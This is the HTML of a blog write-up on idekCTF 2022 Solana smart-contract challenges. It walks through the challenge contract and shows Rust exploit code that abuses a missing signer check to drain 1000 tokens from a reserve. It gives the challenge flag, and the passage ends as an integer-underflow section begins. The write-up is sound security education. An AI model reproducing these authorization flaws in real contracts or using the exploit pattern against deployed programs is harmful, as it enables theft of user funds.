@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>idekCTF 2022 Solana Challenges Write-up - Midas Blog</title><meta name="Description" content="Write-up for idekCTF 2022 Solana challenges"><meta property="og:title" content="idekCTF 2022 Solana Challenges Write-up" />
+<meta property="og:description" content="Write-up for idekCTF 2022 Solana challenges" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lkmidas.github.io/posts/20230303-idekctf2022-writeups/" /><meta property="og:image" content="https://lkmidas.github.io/images/avatar.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-03-03T11:32:39-06:00" />
+<meta property="article:modified_time" content="2023-03-03T11:32:39-06:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://lkmidas.github.io/images/avatar.png"/>
+
+<meta name="twitter:title" content="idekCTF 2022 Solana Challenges Write-up"/>
+<meta name="twitter:description" content="Write-up for idekCTF 2022 Solana challenges"/>
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://lkmidas.github.io/posts/20230303-idekctf2022-writeups/" /><link rel="prev" href="https://lkmidas.github.io/posts/20221128-n1ctf2022-writeups/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "idekCTF 2022 Solana Challenges Write-up",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/lkmidas.github.io\/posts\/20230303-idekctf2022-writeups\/"
+        },"genre": "posts","wordcount":  1284 ,
+        "url": "https:\/\/lkmidas.github.io\/posts\/20230303-idekctf2022-writeups\/","datePublished": "2023-03-03T11:32:39-06:00","dateModified": "2023-03-03T11:32:39-06:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Midas"
+            },"description": "Write-up for idekCTF 2022 Solana challenges"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Midas Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Midas Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">idekCTF 2022 Solana Challenges Write-up</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Midas</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-03">2023-03-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1284 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#idekctf-2022---blockchain-1-2--3">idekCTF 2022 - Blockchain 1, 2 &amp; 3</a>
+      <ul>
+        <li><a href="#given-files">Given files</a></li>
+        <li><a href="#the-target-contract-functionalities">The target contract functionalities</a></li>
+        <li><a href="#the-server-program">The server program</a></li>
+        <li><a href="#the-1st-vulnerability-missing-signer-authorization">The 1st vulnerability: Missing signer authorization</a></li>
+        <li><a href="#the-2nd-vulnerability-integer-underflow">The 2nd vulnerability: Integer Underflow</a></li>
+        <li><a href="#the-3rd-vulnerability-admin-re-initialization">The 3rd vulnerability: Admin Re-initialization</a></li>
+      </ul>
+    </li>
+    <li><a href="#appendix">Appendix</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw" aria-hidden="true"></i>Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><em>Use the table of contents on the right to navigate to the section that you are interested in.</em></div>
+        </div>
+    </div>
+<h2 id="preface">Preface</h2>
+<p>This is a write-up for a CTF that took place several months ago. I was able to solve these challenges quickly during the CTF, so I did not feel the need to write a write-up for them at the time. However, as I have been revisiting Solana vulnerabilities, I believe these challenges are still worth documenting. In addition, this write-up serves to build upon my previous post on Solana Smart Contract exploitation.</p>
+<h2 id="idekctf-2022---blockchain-1-2--3">idekCTF 2022 - Blockchain 1, 2 &amp; 3</h2>
+<h3 id="given-files">Given files</h3>
+<p>There are three challenges in this CTF, all of which implement the same smart contract. The only difference between them is that the first challenge has multiple bugs, while the later ones have one bug fixed at a time. All of them are written using the Anchor Framework, and the file structure is exactly the same as the <code>Simple Staking</code> challenge in my previous post. Some of the important files are:</p>
+<ul>
+<li><code>framework/chall/program/chall/src/lib.rs</code>: the implementation of the target contract.</li>
+<li><code>framework/chall/src/main.rs</code>: the implementation of the initializations on the server using <a href="https://github.com/otter-sec/sol-ctf-framework" target="_blank" rel="noopener noreffer ">Solana CTF Framework</a>.</li>
+<li><code>framework-solve/solve/program/solve/src/lib.rs</code> and <code>framework-solve/solve/src/main.rs</code>: the implementaion of our exploit contract and the its invocation.</li>
+</ul>
+<h3 id="the-target-contract-functionalities">The target contract functionalities</h3>
+<p>The smart contract is straightforward and has the purpose of allowing users to withdraw tokens from a reserved account. However, the naming of the instructions can be confusing, as they are named <code>Initialize</code>, <code>Register</code>, <code>Attempt</code>, and <code>Deposit</code>, instead of the expected <code>Withdraw</code>. To explain the functionalities, I will be using the source code of <code>Blockchain 1</code>.</p>
+<p>Firstly, the <code>Initialize</code> instruction takes an <code>admin</code> account and sets it as the admin of the global <code>config</code> account. Usually, the <code>Initialize</code> instruction can be ignored, but in this case, there is a subtle bug here, which I will explain in a later section.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Rust" data-lang="Rust"><span class="line"><span class="cl"><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">ctx</span>: <span class="nc">Context</span><span class="o">&lt;</span><span class="n">Initialize</span><span class="o">&gt;</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">config</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">config</span><span class="p">.</span><span class="n">admin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">admin</span><span class="p">.</span><span class="n">key</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nb">Ok</span><span class="p">(())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[derive(Accounts)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">struct</span> <span class="nc">Initialize</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">admin</span>: <span class="nc">Signer</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>The <code>Register</code> instruction is used to set up a user&rsquo;s record account, which contains their public key and an amount of <code>tries</code>. Initially, this is set to <code>MAXIMUM_TRIES</code>, which is 3. This value is important for the next instruction.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Rust" data-lang="Rust"><span class="line"><span class="cl"><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">register</span><span class="p">(</span><span class="n">ctx</span>: <span class="nc">Context</span><span class="o">&lt;</span><span class="n">Register</span><span class="o">&gt;</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">record</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user_record</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">record</span><span class="p">.</span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">record</span><span class="p">.</span><span class="n">tries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAXIMUM_TRIES</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">msg</span><span class="o">!</span><span class="p">(</span><span class="s">&#34;[CHALL] register: user {}, tries {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">record</span><span class="p">.</span><span class="n">user</span><span class="p">,</span><span class="w"> </span><span class="n">record</span><span class="p">.</span><span class="n">tries</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nb">Ok</span><span class="p">(())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>The next instruction <code>Attempt</code> is an unusual one. It is used to withdraw token from the reserved account to the user&rsquo;s account, but the amount of token that will be withdrawn is the amount of <code>tries</code>. After each withdrawal, this value will be decremented.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Rust" data-lang="Rust"><span class="line"><span class="cl"><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">attempt</span><span class="p">(</span><span class="n">ctx</span>: <span class="nc">Context</span><span class="o">&lt;</span><span class="n">Attempt</span><span class="o">&gt;</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">record</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">record</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">msg</span><span class="o">!</span><span class="p">(</span><span class="s">&#34;[CHALL] attempt.tries {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">record</span><span class="p">.</span><span class="n">tries</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">record</span><span class="p">.</span><span class="n">tries</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">withdraw_ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CpiContext</span>::<span class="n">new_with_signer</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">token_program</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Transfer</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">from</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">reserve</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">to</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user_account</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">authority</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">reserve</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">signer</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">token</span>::<span class="n">transfer</span><span class="p">(</span><span class="n">withdraw_ctx</span><span class="p">,</span><span class="w"> </span><span class="n">record</span><span class="p">.</span><span class="n">tries</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u64</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">record</span><span class="p">.</span><span class="n">tries</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nb">Ok</span><span class="p">(())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>Finally, the <code>Deposit</code> instruction is just a normal withdraw instruction (yes, it is withdraw, not deposit, the naming is very weird here), where users can withdraw a desired amount of tokens from the reserved account.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Rust" data-lang="Rust"><span class="line"><span class="cl"><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">deposit</span><span class="p">(</span><span class="n">ctx</span>: <span class="nc">Context</span><span class="o">&lt;</span><span class="n">Deposit</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="n">amount</span>: <span class="kt">u64</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">withdraw_ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CpiContext</span>::<span class="n">new_with_signer</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">token_program</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transfer</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">from</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">reserve</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">to</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user_account</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">authority</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">reserve</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">signer</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">token</span>::<span class="n">transfer</span><span class="p">(</span><span class="n">withdraw_ctx</span><span class="p">,</span><span class="w"> </span><span class="n">amount</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nb">Ok</span><span class="p">(())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h3 id="the-server-program">The server program</h3>
+<p>The server program for these challenges is straightforward. Here are the steps it follows:</p>
+<ol>
+<li>Create the following accounts: <code>mint</code>, <code>payer</code>, <code>config</code>, <code>reserve</code>, and <code>user</code>.</li>
+<li>Invoke the <code>Initialize</code> instruction with the <code>payer</code> as the admin account.</li>
+<li>Mint 1000 tokens to the <code>reserve</code> account.</li>
+<li>Create a user&rsquo;s record account and a user&rsquo;s token account.</li>
+<li>Invoke the <code>Register</code> instruction for the user using the accounts created in the previous step.</li>
+<li>Run our exploit contract</li>
+<li>Check if the player has more than 200 tokens. If they do, the flag is printed.</li>
+</ol>
+<p>It&rsquo;s clear that the objective is to acquire over 200 tokens, starting from a balance of 0.</p>
+<h3 id="the-1st-vulnerability-missing-signer-authorization">The 1st vulnerability: Missing signer authorization</h3>
+<p>In <code>Blockchain 1</code>, the account list for the <code>Deposit</code> instruction is declared as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Rust" data-lang="Rust"><span class="line"><span class="cl"><span class="cp">#[derive(Accounts)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">struct</span> <span class="nc">Deposit</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">mint</span>: <span class="nc">Account</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="p">,</span><span class="w"> </span><span class="n">Mint</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cp">#[account(mut)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">admin</span>: <span class="nc">AccountInfo</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cp">#[account(mut)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">user</span>:  <span class="nc">Signer</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">token_program</span>: <span class="nc">Program</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="p">,</span><span class="w"> </span><span class="n">Token</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">system_program</span>: <span class="nc">Program</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="p">,</span><span class="w"> </span><span class="n">System</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">rent</span>: <span class="nc">Sysvar</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="p">,</span><span class="w"> </span><span class="n">Rent</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>Notice how the <code>admin</code> account is declared as <code>AccountInfo</code>, while the <code>user</code> account is declared as <code>Signer</code>. This is a very basic vulnerability here, as the user can simply sign the transaction themselves and withdraw as many tokens as they wish from the <code>reserve</code> account (again, the <code>Deposit</code> instruction means withdraw). One simple invocation is enough to exploit this vulnerability:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Rust" data-lang="Rust"><span class="line"><span class="cl"><span class="kd">let</span><span class="w"> </span><span class="n">cpi_accounts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">chall</span>::<span class="n">cpi</span>::<span class="n">accounts</span>::<span class="n">Deposit</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">config</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">reserve</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">reserve</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">user_account</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user_account</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">mint</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">mint</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">admin</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">admin</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">user</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">token_program</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">token_program</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">system_program</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">system_program</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">rent</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">rent</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">cpi_ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CpiContext</span>::<span class="n">new</span><span class="p">(</span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">chall</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w"> </span><span class="n">cpi_accounts</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chall</span>::<span class="n">cpi</span>::<span class="n">deposit</span><span class="p">(</span><span class="n">cpi_ctx</span><span class="p">,</span><span class="w"> </span><span class="mi">1000</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>The flag for this challenge is <code>idek{b391dba7-4766-4191-9117-55a1202c86d8}</code></p>
+<p>This vulnerability is fixed in <code>Blockchain 2</code> by changing the <code>admin</code> account to <code>Signer</code> and the <code>user</code> account to <code>AccountInfo</code>.</p>
+<h3 id="the-2nd-vulnerability-integer-underflow">The 2nd vulnerability: Integer Underflow</h3>
+<p>You may have already noticed a vulnerability while reading through the contract&rsquo;s functionalities above. This vulnerability is related to an Integer Underflow bug in the suspicious instruction <code>Attempt</code>. In fact, this was the first vulnerability I discovered when solving these challenges, not the previous one.</p>
